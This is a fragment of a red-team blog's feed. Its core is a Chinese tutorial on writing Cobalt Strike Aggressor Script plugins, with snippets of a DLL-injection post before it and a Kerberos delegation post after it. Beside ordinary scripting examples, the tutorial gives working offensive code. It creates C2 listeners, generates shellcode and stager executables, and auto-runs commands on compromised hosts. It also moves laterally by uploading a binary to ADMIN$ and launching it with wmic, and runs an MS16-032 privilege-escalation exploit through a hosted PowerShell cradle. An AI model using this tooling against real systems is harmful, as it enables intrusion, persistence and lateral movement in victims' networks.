pid=findbyname(processname);        dllinject(dllpath, pid);        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/09/14/wBYpM8.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;太久没更新，都忘了写了。最近研究了一下远程DLL注入&lt;br&gt;做个笔记&lt;/p&gt;
&lt;h2 id=&quot;CreateRemoteThread远程线程调用&quot;&gt;&lt;a href=&quot;#CreateRemoteThread远程线程调用&quot; class=&quot;headerlink&quot; title=&quot;Cr</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>cs插件开发</title>
    <link href="http://422926799.github.io/posts/e5e87074.html"/>
    <id>http://422926799.github.io/posts/e5e87074.html</id>
    <published>2020-08-12T02:23:20.000Z</published>
    <updated>2020-08-12T10:05:50.538Z</updated>
    
    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1459722976&auto=1&height=66"></iframe><p>之前就有开发cs插件的意向，当时看了文档表示哪里有”老婆”好看就关闭了文档<br>现在重新打开看了一遍，所以写个笔记<br>注：本文大量参考先知社区的三篇cs开发文章，文章底部会给出参考链接</p><p>首发WBG的git books</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p> agscript是Armitage的开源脚本引擎Cortana的精神继承者。 因为DARPA的Cyber Fast Track计划才使Cortana成了可能。 Cortana支持开发者通过Armitage的团队服务器扩展Armitage并控制Metasploit Framework及其功能。 当然，Cobalt Strike 3.0并不是以Armitage为基础的重写的。 这次大弧度的版本升级是为了重新审视Cobalt Strike，并围绕Cobalt Strike的功能进行重构。 产物就是agscript的诞生。<br>agscript是一种简单脚本语言，主要用于红队编写针对肉鸡的攻击脚本。 它有两个作用，一是可以用来对自己的肉鸡做持久性控制，二是可以用来扩展或修改Cobalt Strike客户端以满足您的个性化需求。</p><p>agscript是以Cobalt Strike 3.0为基础的。 Cobalt Strike 3.0中绝大部分菜单/按钮事件都是由agscript引擎支撑。 Strategic Cyber LLC尚未为Cobalt Strike的大多数功能写API，也就是说，agscript目前仍处于起步阶段。 在未来，我们也期待看到agscript的发展壮大。这份文档也会<strong>随着时间的推移而变动</strong>。</p><h2 id="加载cs脚本"><a href="#加载cs脚本" class="headerlink" title="加载cs脚本"></a>加载cs脚本</h2><p>如何加载脚本?agscript内置于Cobalt Strike 客户端，如果需要长期使用agscript,<br>请移步Cobalt Strike客户端 -&gt; Script Manager and press Load功能。<br><img src="/images/cs/cs.png" alt=""></p><h2 id="脚本控制台"><a href="#脚本控制台" class="headerlink" title="脚本控制台"></a>脚本控制台</h2><p>Cobalt Strike提供了交互式的脚本控制台。 通过控制台可跟踪，配置，调试以及管理脚本。可以通过View- &gt; Script Console获得进入agscript控制台。<br>基础命令：<br><img src="/images/cs/command.png" alt=""></p><p><img src="/images/cs/1.png" alt=""></p><h2 id="命令行使用Cobalt-Strike"><a href="#命令行使用Cobalt-Strike" class="headerlink" title="命令行使用Cobalt Strike"></a>命令行使用Cobalt Strike</h2><p>(注意：cmd得进入到agscript的路径里，否则会出现无法加载主体的情况)您也许会希望在在没有GUI的情况下启动Cobalt Strike，客户端压缩包中的agscript这个脚本文件能够满足您的需求，连接命令：</p><pre><code>./agscript [host] [port] [user] [password]</code></pre><p>远程连接cs并执行脚本</p><pre><code>./agscript [host] [port] [user] [password] [/path/to/script.cna]</code></pre><p>test.cna</p><pre><code>on ready {    println(&quot;Hello cs&quot;);    closeClient();}</code></pre><p><img src="/images/cs/hello.png" alt=""></p><p><img src="/images/cs/runhello.png" alt=""></p><h2 id="Sleep语言基础"><a href="#Sleep语言基础" class="headerlink" title="Sleep语言基础"></a>Sleep语言基础</h2><p>agscript是基于Raphael Mudge的Sleep语言的二次开发的。<br>原手册见：<a href="http://sleep.dashnine.org/manual" target="_blank" rel="noopener">http://sleep.dashnine.org/manual</a></p><p>注释符： #</p><p>Sleep能做的agscript都能做，下面是一些注意事项：Sleep的语法，运算符甚至俚语都与Perl极其类似,简单说一个他们的区别,Sleep需要的语句之间需要有空格，以下代码无效：（关键：但凡你少一个空格都能给你报错或者不输出，例如:println(“a=&gt;$a”)，他不会给你输出出来）</p><pre><code>$x=1+2; # 错误$x = 1+2; #正确</code></pre><p>错误例子：<br><img src="/images/cs/error.png" alt=""></p><p>正确例子:<br><img src="/images/cs/sucess.png" alt=""></p><p>Sleep的变量有标量，字符串，各自类型的数字，Java对象引用，函数，数组以及字典等。<br>以下是Sleep中的常见的几种变量：</p><pre><code>$x = &quot;Hello World&quot;;$y = 3;$z = @(1, 2, 3, &quot;four&quot;); #数组 $a = %(a = &gt; &quot;apple&quot;, b = &gt; &quot;bat&quot;, c = &gt; &quot;awesome language&quot;, d = &gt; 4); #字典</code></pre><p>Sleep会插入双引号的字符串，这意味着以\$符号开头的任何以空格分隔的标记都将替换为其值。<br>特殊变量$+将插字符串与另一个值连接起来。</p><pre><code>println(&quot;\$a is: $a and \n\$x joined with \$y is: $x $+ $y&quot;);</code></pre><p><img src="/images/cs/2.png" alt=""></p><p>有一个和println类似的函数叫warn，不同的是warn输出的内容中包含了当前代码的文件名和行数<br>一般用于调试错误<br><img src="/images/cs/warn.png" alt=""></p><p>使用sub字符即可声明函数，传给函数的参数标记为$1,$2,一直到$n。函数可以接受无数个参数。<br>变量@<em>是一个包含所有参数的数组，$1，$2等变量的更改将改变@</em>的内容。</p><pre><code>sub addTwoValues {    println($1  +  $2);}addTwoValues(&quot;3&quot;, 55.0);</code></pre><p><img src="/images/cs/sub.png" alt=""></p><p>字典的使用</p><pre><code>on ready {    $x = 3;    %foo[&quot;name&quot;] = &quot;Raphael&quot;;//这tm还能自己创建一个字典    %foo[&quot;job&quot;]  = &quot;wasting time&quot;;     %foo[$x]     = &quot;Michelangelo&quot;;     println(&quot;%foo is: &quot; . %foo);     foreach $data (keys(%foo)){         //遍历字典 println(&quot;$data =&gt;&quot;.%foo[$data]);     }         closeClient(); } 遍历字典第二个方法foreach $key = &gt; $value (%foo) {    println(&quot;$key =&gt; $value&quot;);}删除字典的某个keyon ready {    $x = 3;    %a = %(data = &gt; &quot;aaa&quot;, data2 = &gt; &quot;bbbb&quot;);    removeAt(%a, &quot;data&quot;);    #或者删除多个key可以这么写 removeAt(%a, &quot;data&quot;, &quot;data2&quot;);    println(%a);    closeClient();}</code></pre><p><img src="/images/cs/dict.png" alt=""></p><p>数组的增、删、改、查</p><pre><code>on ready {    $x = 3;    $a = @(&quot;data&quot;);    add($a, &quot;wYYYYYYYYYYYYYYYYYYYYYYYY&quot;, - 1); #数组添加，默认在tm，0位前添加, 需要自己指定位置     println($a);    println($a[ - 1]);#查询         closeClient();}#数组遍历 on ready {    $data = @(1, 2, 3, 4, 5, 6, 7, 8);    foreach $index ($data) {        println($index);    }    closeClient();}</code></pre><p><img src="/images/cs/listforeach.png" alt=""></p><pre><code>on ready {    $x = 3;    $a = @(&quot;data&quot;);    add($a, &quot;wYYYYYYYYYYYYYYYYYYYYYYYY&quot;, - 1); #数组添加，默认在tm，0位前添加, 需要自己指定位置 println($a);    remove($a, - 1, &quot;data&quot;);//得指定删除的内容。。。     println($a);     closeClient(); }</code></pre><p><img src="/images/cs/listdel.png" alt=""></p><p>逻辑判断<br>（and-&gt;&amp;&amp;,or-&gt;|,true,false）<br><img src="/images/cs/bool.png" alt=""></p><pre><code>on ready {    $x = 3;    if ($x == 3)  {        println(1);    }    closeClient();}</code></pre><p><img src="/images/cs/bool2.png" alt=""></p><p>判断是不是数组之类的操作<br><img src="/images/cs/bool3.png" alt=""></p><pre><code>on ready {    $data = @(&quot;data&quot;);    if (! - isnumber $data)  {        println(1);    }    closeClient();}</code></pre><p><img src="/images/cs/isnumber.png" alt=""></p><p>循环</p><pre><code>sub range {    # Returns a new function that returns the next number in the    # range with each call.  Returns $null at the end of the range    # Don&#39;t worry, closures will come in the next chapter :)        return lambda( {        return iff($begin &lt;= $end, $begin++  -  1, $null);    }, $begin = &gt; $1, $end = &gt; $2);}on ready {    foreach $value (range(1, 10)) {        println($value);    }    closeClient();}</code></pre><p><img src="/images/cs/foreach.png" alt=""></p><p>字符串处理</p><pre><code>$a = &quot;data&quot;.&quot;data&quot;;#字符串的拼接 #字符串替换 on ready {    $a = &quot;data&quot;.&quot;data&quot;;    $a = replace($a, &quot;data&quot;, &quot;Fk&quot;);    println($a);    closeClient();}#获取字符串长度 $data = &quot;dataing&quot;;println(strlen($data));#获取字符串指定位置 $data = &quot;dataing&quot;;println(substr($data, 0, 3));#字符串指定内容替换成数组 （函数奇葩的要命，草） $a = &quot;data&quot;.&quot;.data&quot;;$b = split(&#39;.&#39;, $a);println($b);#数组转字符串 println(join(&#39;|&#39;, @(&quot;ape&quot;, &quot;bat&quot;, &quot;cat&quot;, &quot;dog&quot;)));</code></pre><p>判断一个字符串是否在数组里</p><pre><code>$data = @(&quot;abc&quot;, &quot;bqe&quot;);$str = &quot;abc&quot;;if ($str in $data)  {    println(111);}</code></pre><p>文件读写</p><pre><code>逐行读取文件 $handle = openf(&quot;/etc/passwd&quot;);while $text (readln($handle)) {    println(&quot;Read: $text&quot;);}一次性读完$handle = openf(&quot;/path/to/key.pem&quot;);$keydata = readb($handle, - 1);closef($handle);写入文件 $handle = openf(&quot;&gt;data.txt&quot;);println($handle, &quot;this is some data.&quot;);closef($handle);写入文件方法2 $handle = openf(&quot;&gt;out.txt&quot;);writeb($handle, $data);closef($handle);</code></pre><p>更多操作参考文档</p><h2 id="CS开发-命令快捷键"><a href="#CS开发-命令快捷键" class="headerlink" title="CS开发 - 命令快捷键"></a>CS开发 - 命令快捷键</h2><pre><code>command test {    println(&quot;value: $1&quot;);}</code></pre><p><img src="/images/cs/cscommand.png" alt=""></p><h2 id="CS开发-控制台颜色设置"><a href="#CS开发-控制台颜色设置" class="headerlink" title="CS开发 - 控制台颜色设置"></a>CS开发 - 控制台颜色设置</h2><p>如果你想给Cobalt Strike的控制台添加一些色彩，通过\c，\U和\o转义即可告诉Cobalt Strike如何格式化文本。 值得提醒的是这些转义仅在双引号字符串内有效。\cX就是告诉Cobalt Strike你想输出什么颜色，X是颜色的值<br><img src="/images/cs/color.png" alt=""><br>U是告诉控制台添加下划线，\o则是重置这些花里胡哨的东西。<br><img src="/images/cs/color2.png" alt=""></p><h2 id="CS开发-快捷键绑定"><a href="#CS开发-快捷键绑定" class="headerlink" title="CS开发 - 快捷键绑定"></a>CS开发 - 快捷键绑定</h2><pre><code>bind Ctrl + H {    show_message(&quot;DIO&quot;);}</code></pre><p>快捷键可以是任何ASCII字符或特殊键，快捷方式可能会应用一个或多个修饰符，修饰符修饰符仅为以下几个特定按键：Ctrl，Shift，Alt，Meta。脚本可以指定修饰符+键。<br>按Ctrl+H效果如下<br><img src="/images/cs/bind.png" alt=""></p><h2 id="CS开发-弹出菜单"><a href="#CS开发-弹出菜单" class="headerlink" title="CS开发 - 弹出菜单"></a>CS开发 - 弹出菜单</h2><pre><code>popup help {    item(&quot;&amp;blog&quot;, {        url_open(&quot;https://422926799.github.io&quot;);    }    );    item(&quot;&amp;System Information&quot;, {        openSystemInformationDialog();    }    );}</code></pre><p><img src="/images/cs/map.png" alt=""></p><p><img src="/images/cs/map2.png" alt=""></p><p>添加子菜单</p><pre><code>popup help {    item(&quot;&amp;blog&quot;, {        url_open(&quot;https://422926799.github.io&quot;);    }    );    menu &quot;&amp;Testing&quot; {        #Testing菜单下会有blog         item(&quot;&amp;blog&quot;, {            url_open(&quot;https://422926799.github.io&quot;);        }        );    }}</code></pre><p><img src="/images/cs/map3.png" alt=""></p><h2 id="CS开发-自定义输出"><a href="#CS开发-自定义输出" class="headerlink" title="CS开发 - 自定义输出"></a>CS开发 - 自定义输出</h2><pre><code>set EVENT_SBAR_LEFT {    return &quot;[&quot; . tstamp(ticks()) . &quot;] &quot; . mynick();}set EVENT_SBAR_RIGHT {    return &quot;[lag: $1 $+ ]&quot;;}</code></pre><p>上面的代码定义了Cobalt Strike的事件日志（View -&gt; Event Log）中状态栏的内容，此状态栏的左侧显示当前时间和您的昵称，右侧显示了Cobalt Strike客户端和团队服务器之间的消息往返时间。Cobalt Strike中默认的各种设置都可以通过统一的方法来修改覆盖</p><p>测试了一下貌似并没有什么变化<br><img src="/images/cs/set.png" alt=""></p><h2 id="CS开发-事件管理"><a href="#CS开发-事件管理" class="headerlink" title="CS开发 - 事件管理"></a>CS开发 - 事件管理</h2><p>使用on这个关键字可以为事件定义处理程序，当Cobalt Strike连接到团队服务器并准备代表您行动时，就绪事件将触发</p><pre><code>on ready {    show_message(&quot;舰长，我的狐狸耳朵，喜欢吗？&quot;);}</code></pre><p><img src="/images/cs/ready.png" alt=""></p><p>使用* meta-event可查看再Cobalt Strike中发生的所有事件。</p><pre><code>on  * { #加载脚本的时候就运行    local(&#39;$handle $event $args&#39;);    $event = shift(@_);    $args = join(&quot; &quot;, @_);    $handle = openf(&quot;&gt;&gt;eventspy.txt&quot;);    writeb($handle, &quot;[ $+ $event $+ ] $args&quot;);    closef($handle);}</code></pre><p><img src="/images/cs/evt.png" alt=""></p><h2 id="CS数据模型"><a href="#CS数据模型" class="headerlink" title="CS数据模型"></a>CS数据模型</h2><p><img src="/images/cs/datax.png" alt=""><br>调用这些函数会返回一个模型中每个条目的数组，每行对于的是一个字典，字典中包含了键与其键值。<br><img src="/images/cs/info.png" alt=""></p><h2 id="CS开发-监听器信息"><a href="#CS开发-监听器信息" class="headerlink" title="CS开发 - 监听器信息"></a>CS开发 - 监听器信息</h2><p>agscript会收集来自连接到的当前团队服务器的监听器的信息，这样做的好处是可以轻松地将会话转移给另一台团队服务器，想要获取所有监听器名称的列表可以使用＆listeners函数,只使用本地侦听器的话用＆listeners_local函数,＆listener_info函数可将监听器名称解析为其配置信息<br><img src="/images/cs/listen2.png" alt=""></p><pre><code>command list {    println(&quot;监视器&quot;);    println(&quot;------------------------------------------------------&quot;);    foreach $listener (listeners()) {        println(&quot;name: $listener&quot;);        println(&quot;---------- $listener --------------&quot;);        %data = listener_info($listener);        foreach $key = &gt; $value (%data) {            println(&quot;$key =&gt; $value&quot;);        }        println(&quot;&quot;);        println(&quot;&quot;);    }}</code></pre><p><img src="/images/cs/listen3.png" alt=""></p><p>监听器常用的函数：<br><img src="/images/cs/listeninfo.png" alt=""></p><p>简单的做一个插件</p><pre><code>command list{    println(&quot;监视器&quot;);    println(&quot;------------------------------------------------------&quot;);    foreach $listener (listeners()){        println(&quot;name: $listener&quot;);        println(&quot;---------- $listener --------------&quot;);        %data = listener_info($listener); #解析监听器获取监听器详细信息        foreach $key =&gt; $value (%data){            println(&quot;$key =&gt; $value&quot;);        }        println(&quot;&quot;);        println(&quot;&quot;);    }}command list_create{    $name = $1;    $payload = $2;    $host = $3;    $port = $4;    $beacons = $5;    $payloads = @(&quot;windows/beacon_dns/reverse_dns_txt&quot;, &quot;windows/beacon_http/reverse_http&quot;, &quot;windows/beacon_http/reverse_https&quot;, &quot;windows/beacon_bind_pipe&quot;, &quot;windows/beacon_bind_tcp&quot;, &quot;windows/beacon_extc2&quot;, &quot;windows/foreign/reverse_http&quot;, &quot;windows/foreign/reverse_https&quot;);    if ((strlen($name)  &gt; 0) &amp;&amp; (strlen($payload) &gt; 0) &amp;&amp; (strlen($host) &gt; 0) &amp;&amp; (strlen($port) &gt; 0) &amp;&amp; (strlen($beacons) &gt; 0)){        if($payload in $payloads){            listener_create($name, $payload, $host, $port, $beacons); #新建监听器            println(&quot;create listen sucess:&quot;);            println(&quot;Listen_name: $name&quot;);            println(&quot;payload: $payload&quot;);            println(&quot;host: $host&quot;);            println(&quot;port: $port&quot;);            println(&quot;beacons: $beacons&quot;);        }else{            println(&quot;\c5Not Found payload:&quot;.$payload);            println(&quot;payload-&gt;&quot;);            foreach $p ($payloads){                println(&quot;$p&quot;);            }        }    }else{        println(&quot;list_create &lt;listen_name&gt; &lt;payload&gt; &lt;host&gt; &lt;port&gt; &lt;beacons&gt;&quot;);        println(&quot;\c8Multiple bacons are separated by commas&quot;);        println(&quot;Example:list_create test3 windows/beacon_http/reverse_http 192.168.1.108 9090 192.168.1.108&quot;);        println(&quot;\c8Supported payload:&quot;);        foreach $p ($payloads){            println($p);        }    }}command list_del{    $name = $1;    if(strlen($name) &gt; 0){        if ($name in listeners()){            listener_delete($name);            println(&quot;del listen: $name Sucess&quot;); #删除监听器        }else{            println(&quot;\c5Not found listen name:&quot;.$name);            println(&quot;list listen:&quot;)            foreach $n (listeners()){                println($n);            }        }    }else{        println(&quot;list_del &lt;listen_name&gt;&quot;);        println(&quot;Example:list_del test3&quot;);    }}</code></pre><p>效果如下<br>监听器查询<br><img src="/images/cs/listenquery.png" alt=""></p><p>监听器创建<br><img src="/images/cs/listencreate.png" alt=""></p><p><img src="/images/cs/listencreate2.png" alt=""></p><p><img src="/images/cs/listensucess.png" alt=""></p><p>监听器删除<br><img src="/images/cs/listendel.png" alt=""></p><p>监听器选择<br>示例代码有个用UI创建监听器的</p><pre><code>item &quot;&amp;Spawn&quot; {    openPayloadHelper(lambda({        binput($bids, &quot;spawn $1&quot;); #在指定的机器上执行指定的操作（子 进 程）        bspawn($bids, $1); #要求信标产生一个新的会话    }, $bids =&gt; $1));}修改popup beacon_bottom{    item &quot;&amp;NewSpawn&quot; {        openPayloadHelper(lambda({            binput($bids, &quot;spawn $1&quot;);            bspawn($bids, $1);        }, $bids =&gt; $1));    }}</code></pre><p><img src="/images/cs/newspawn.png" alt=""></p><p>从上线的机器里在上线，就是spawn的功能<br><img src="/images/cs/newspacn2.png" alt=""></p><h2 id="CS开发-shellcode生成"><a href="#CS开发-shellcode生成" class="headerlink" title="CS开发 - shellcode生成"></a>CS开发 - shellcode生成</h2><pre><code>command shellcode_create{    $listenname = $1;    $handle = $2;    $arch = $3;    if((strlen($listenname) &gt; 0) &amp;&amp; (strlen($handle) &gt; 0) &amp;&amp; (strlen($arch) &gt; 0)){        println(&quot;Arch: $arch&quot;);        println(&quot;listen name: $listenname&quot;);        println(&quot;handle: $handle&quot;);        $data = shellcode($listenname, $handle, $arch);        $dk = openf(&quot;&gt;shellcode.bin&quot;);        writeb($dk, $data);        closef($dk);        println(&quot;create shellcode.bin sucess&quot;);    }else{        println(&quot;shellcode_create &lt;listenname&gt; &lt;remote_host&gt; &lt;arch&gt;&quot;);    }}</code></pre><p><img src="/images/cs/shellcodecreate.png" alt=""></p><h2 id="CS开发-exe-dll开发"><a href="#CS开发-exe-dll开发" class="headerlink" title="CS开发 - exe/dll开发"></a>CS开发 - exe/dll开发</h2><p>分段马生成</p><pre><code>command payload_create{    $filename = $1;    $listenname = $2;    $format = $3;    $arch = $4;    if((strlen($filename) &gt; 0) &amp;&amp; (strlen($listenname) &gt; 0) &amp;&amp; (strlen($format) &gt; 0) &amp;&amp; (strlen($arch) &gt; 0)){        $data = artifact_stager($listenname, $format, $arch);        $dk = openf(&quot;&gt;$filename&quot;);        writeb($dk, $data);        closef($dk);        println(&quot;create payload: $filename Sucess&quot;);    }else{        println(&quot;payload_create &lt;payload_create&gt; &lt;listenname&gt; &lt;format&gt; &lt;arch&gt;&quot;);    }}</code></pre><p><img src="/images/cs/active.png" alt=""></p><p>分段马生成</p><pre><code>sub ready {    local(&#39;$handle&#39;);    $handle = openf(&quot;&gt;beacon.exe&quot;);    writeb($handle, $1);    closef($handle);}artifact_stageless(&quot;my listener&quot;, &quot;exe&quot;, &quot;x86&quot;, &quot;&quot;, &amp;ready);</code></pre><p>还有powershell生成之类的，就不写了</p><h2 id="CS开发-beacon信息获取"><a href="#CS开发-beacon信息获取" class="headerlink" title="CS开发 - beacon信息获取"></a>CS开发 - beacon信息获取</h2><pre><code>command beacons{    foreach $entry (beacons()){        println(&quot;=========ip:\c9&quot;.$entry[&quot;external&quot;].&quot;\o=========&quot;.&quot;user:\c9&quot;.$entry[&quot;user&quot;].&quot;\o=========&quot;.&quot;pid:\c9&quot;.$entry[&quot;pid&quot;].&quot;\o=========&quot;.&quot;arch:\c9&quot;.$entry[&quot;arch&quot;].&quot;\o=========&quot;.&quot;computer:\c9&quot;.$entry[&quot;computer&quot;]);        foreach $key =&gt; $value ($entry){            println(&quot;$key =&gt; $value&quot;);        }        println(&quot;&quot;);    }}</code></pre><p><img src="/images/cs/beaconinfo.png" alt=""></p><h2 id="CS开发-处理新的beacons会话"><a href="#CS开发-处理新的beacons会话" class="headerlink" title="CS开发 - 处理新的beacons会话"></a>CS开发 - 处理新的beacons会话</h2><p>为给新的Beacons会话添加一个自动运行的脚本，或者是让所有的新会话都运行一遍写好的功能</p><pre><code>on beacon_initial{    binput($1, &quot;shell whoami&quot;);}</code></pre><p>新机器一上线就会自动执行这个函数里的功能<br><img src="/images/cs/setx.png" alt=""></p><h2 id="CS开发-beacon操控"><a href="#CS开发-beacon操控" class="headerlink" title="CS开发 - beacon操控"></a>CS开发 - beacon操控</h2><p><strong>alias</strong><br>类似于在agscript控制台定义命令的command一样，不过alias是给beacon控制操控的</p><pre><code>alias test{    bshell!($1, &quot;whoami&quot;);}</code></pre><p><img src="/images/cs/alias.png" alt=""></p><p><strong>已上线的机器右键菜单</strong></p><pre><code>popup beacon_bottom{    item &quot;query user&quot;{        prompt_text(&quot;Query User&quot;, &quot;administrator&quot;, lambda({            bshell(@ids, &quot;net user &quot;.$1);        }, @ids =&gt; $1));    }}</code></pre><p><img src="/images/cs/prompt_text.png" alt=""></p><p><img src="/images/cs/prompt_text2.png" alt=""></p><p><img src="/images/cs/prompt_text3.png" alt=""></p><p>询问框框等的常见操作，可以参考文档里的这里：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#prompt_text" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html#prompt_text</a></p><p><strong>右键菜单(子菜单/多菜单)</strong></p><pre><code>popup beacon_bottom{    menu &quot;test&quot;{        item &quot;query user&quot;{            prompt_text(&quot;Query User&quot;, &quot;administrator&quot;, lambda({                bshell($ids, &quot;net user &quot;.$1);            }, $ids =&gt; $1));        }        item &quot;run command&quot;{            prompt_text(&quot;Run command&quot;, &quot; &quot;, lambda({                bshell($ids, $1);            }, $ids =&gt; $1));        }    }}</code></pre><p><img src="/images/cs/menu.png" alt=""></p><p><strong>文件上传</strong><br>这里的文件上传，要么把要上传的文件放到当前插件的目录。要么用bcd切换工作目录，在进行bupload</p><pre><code>alias uploadtest{    bupload($1, script_resource(&quot;calc.exe&quot;));    bmv($1, &quot;calc.exe&quot;, &quot;C:\\Temp\\dio.exe&quot;); #上传的文件移动到指定的路径}</code></pre><p><img src="/images/cs/beaconupload.png" alt=""></p><p><strong>task</strong><br>用于叙述任务</p><pre><code>alias task{    btask($1, &quot;This is Task,so ?&quot;);    bshell($1, &quot;echo this is task&quot;);}</code></pre><p><img src="/images/cs/task.png" alt=""></p><h2 id="CS开发-官方案例"><a href="#CS开发-官方案例" class="headerlink" title="CS开发 - 官方案例"></a>CS开发 - 官方案例</h2><p><strong>已有指令覆盖</strong><br>Aliases添加的快捷指令可以覆盖已存在的命令，直接看一个覆盖内置powershell指令</p><pre><code>alias powershell {    local(&#39;$args $cradle $runme $cmd&#39;); #定义变量    # $0 is the entire command with no parsing.    $args   = substr($0, 11); #$0是获取输入的原始指令，使用substr函数获取第十一个字符之后的字符串(&quot;powershell&quot;十个字符串加一个空格)    # generate the download cradle (if one exists) for an imported PowerShell script    $cradle = beacon_host_imported_script($1); #将马子放到web，用于准备下载执行    # encode our download cradle AND cmdlet+args we want to run    $runme  = base64_encode( str_encode($cradle . $args, &quot;UTF-16LE&quot;) ); #将命令和脚本base64编码，这里编码成utf-16是因为powershell的base64默认编码是utf-16的    # Build up our entire command line.    $cmd    = &quot; -nop -exec bypass -EncodedCommand \&quot; $+ $runme $+ \&quot;&quot;; #拼接指令    # task Beacon to run all of this.    btask($1, &quot;Tasked beacon to run: $args&quot;, &quot;T1086&quot;); #任务描述    beacon_execute_job($1, &quot;powershell&quot;, $cmd, 1); #使用beacon_execute_job函数执行命令并返回结果给Beacon}</code></pre><p><strong>横向移动</strong></p><pre><code>alias wmi-alt {    local(&#39;$mydata $myexe&#39;);    # check if our listener exists    if (listener_info($3) is $null) {        berror($1, &quot;Listener $3 does not exist&quot;);        return;    }    # generate our executable artifact    $mydata = artifact($3, &quot;exe&quot;, true); #马子生成    # generate a random executable name    $myexe  = int(rand() * 10000) . &quot;.exe&quot;; #随机名称    # state what we&#39;re doing.    btask($1, &quot;Tasked Beacon to jump to $2 (&quot; . listener_describe($3, $2) . &quot;) via WMI&quot;, &quot;T1047&quot;);    # upload our executable to the target    bupload_raw!($1, &quot;\\\\ $+ $2 $+ \\ADMIN$\\ $+ $myexe&quot;, $mydata); #文件上传到目标    # use wmic to run myexe on the target    bshell!($1, &quot;wmic /node: $+ $2 process call create \&quot;c:\\windows\\ $+ $myexe $+ \&quot;&quot;); #wmic运行上传的马子    # complete staging process (for bind_pipe listeners)    bstage($1, $2, $3); #已删除此功能在Cobalt Strike 4.0中已删除。 使用＆beacon_stage_tcp或＆beacon_stage_pipe显式暂存有效负载。 使用＆beacon_link链接到它。}</code></pre><p><strong>提权</strong></p><pre><code>sub ms16_032_exploit {    local(&#39;$script $oneliner&#39;);    # acknowledge this command    btask($1, &quot;Tasked Beacon to run &quot; . listener_describe($2) . &quot; via ms16-032&quot;, &quot;T1068&quot;);    # generate a PowerShell script to run our Beacon listener    $script = artifact($2, &quot;powershell&quot;); #根据指定的监听器生成马子内容    # host this script within this Beacon    $oneliner = beacon_host_script($1, $script); #将马子放到web，用于准备下载执行    # task Beacon to run this exploit with our one-liner that runs Beacon    bpowershell_import!($1, script_resource(&quot;Invoke-MS16032.ps1&quot;)); #导入powershell脚本    bpowerpick!($1, &quot;Invoke-MS16032 -Command \&quot; $+ $oneliner $+ \&quot;&quot;); #生成一个新的进程注入powershell脚本    # handle staging (if we&#39;re dealing with a named pipe Beacon; does nothing otherwise)    bstage($1, $null, $2);}</code></pre><p>远程主机powershell使用例子<br>beacon_host_script重新说明一下：用于将指定的powershell脚本/内容，放到web。生成远程调用命令<br>bpowerpick：在目标机执行powershell command</p><pre><code>alias test{    $path = &quot;test.ps1&quot;;    $script = &quot;wmic process call create calc&quot;;    $oneliner = beacon_host_script($1, $script); #将马子放到web，用于准备下载执行    bpowerpick($1, $oneliner); #新开进程注入powershell脚本}</code></pre><p><img src="/images/cs/powershell.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/5887" target="_blank" rel="noopener">https://xz.aliyun.com/t/5887</a> CobaltStrike插件开发官方指南 Part1<br><a href="https://xz.aliyun.com/t/5892" target="_blank" rel="noopener">https://xz.aliyun.com/t/5892</a> CobaltStrike插件开发官方指南 Part2<br><a href="https://xz.aliyun.com/t/6188" target="_blank" rel="noopener">https://xz.aliyun.com/t/6188</a> CobaltStrike插件开发官方指南 Part3<br><a href="https://www.cobaltstrike.com/aggressor-script" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script</a> cs官方开发文档<br><a href="http://sleep.dashnine.org/manual" target="_blank" rel="noopener">http://sleep.dashnine.org/manual</a> sleep官方文档</p>]]></content>
    
    
      
      
    <summary type="html">&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>资源委派(提权/横向移动)</title>
    <link href="http://422926799.github.io/posts/c34daaac.html"/>
    <id>http://422926799.github.io/posts/c34daaac.html</id>
    <published>2020-08-03T15:36:05.000Z</published>
    <updated>2020-08-03T16:28:35.603Z</updated>
    
    <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=26484368&auto=1&height=66"></iframe><br>早在之前看一篇名为”烂番茄提取”的文章的时候就想复现，后面一直没用成功。昨天在搞ACL的时候发现kerberos资源委派提前权，一看。说的不就是这吗，捣鼓了一下写篇文章</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>利用用户的ACL（msDS-AllowedToActOnBehalfOfOtherIdentity）属性配合kerberos S4U实现凭证伪造<br>（原文章没怎么说原理，烂番茄那篇说的有点复杂。我可能没有描述完整（甚至可能有错误），如果想深入了解原理可以看原文<br><a href="https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/）" target="_blank" rel="noopener">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/）</a></p><p>使用msDS-AllowedToActOnBehalfOfOtherIdentity属性实现横向/提权<br>msDS-AllowedToActOnBehalfOfOtherIdentity介绍：ms-DS允许代表其他身份采取行动</p><p>利用要求：</p><pre><code>* 目标DC是windows server 2012或以上* 域用户拥有ACL GenericAll/GenericWrite/WriteProperty权限（使用目标域用户加入域的时候默认自带这些权限）* 目标机器名称* 域管理用户名称</code></pre><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>domain:YAYI.local (原本叫domain.local那个域被我玩炸了…重装了)<br>域管用户:yayis<br>ip:192.168.113.132 DC<br>ip:192.168.113.223 YYC 